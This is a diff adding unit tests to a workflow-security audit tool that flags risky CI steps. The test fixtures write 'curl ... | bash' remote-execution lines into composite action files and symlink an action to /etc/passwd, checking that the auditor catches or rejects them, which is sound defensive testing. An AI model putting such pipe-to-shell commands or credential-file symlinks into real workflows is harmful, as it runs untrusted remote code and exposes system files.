@@ -122,6 +122,31 @@ class RatchetTests(unittest.TestCase):
         self.write("jobs:\n  x:\n    steps:\n      - run: curl https://example.invalid | bash\n      - run: echo added\n")
         self.assertEqual(mod.audit(self.repo, legacy, self.commit()).new_risky_workflows, 1)
 
+    def test_nested_local_composite_action_remote_shell_rejected(self):
+        action = self.repo / "examples" / "packaging" / "action.yaml"
+        action.parent.mkdir(parents=True)
+        action.write_text(
+            "name: packaging\nruns:\n  using: composite\n  steps:\n"
+            "    - shell: bash\n      run: curl -fsSL https://example.invalid/i | bash\n",
+            encoding="utf-8",
+        )
+        r = mod.audit(self.repo, self.base, self.commit())
+        self.assertEqual(r.new_risky_workflows, 1)
+        self.assertEqual(r.candidate_findings, 1)
+
+    def test_symlinked_nested_action_rejected(self):
+        action = self.repo / "examples" / "packaging" / "action.yml"
+        action.parent.mkdir(parents=True)
+        action.symlink_to("/etc/passwd")
+        with self.assertRaises(mod.SourceError):
+            mod.audit(self.repo, self.base, self.commit())
+
+    def test_unrelated_yaml_docs_not_treated_as_action(self):
+        doc = self.repo / "docs" / "example.yml"
+        doc.parent.mkdir(parents=True)
+        doc.write_text("run: curl https://example.invalid/i | bash\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).candidate_findings, 0)
+
     def test_symlink_tree_rejected_and_redacted(self):
         target = self.repo / ".github/workflows/demo.yml"
         target.unlink()
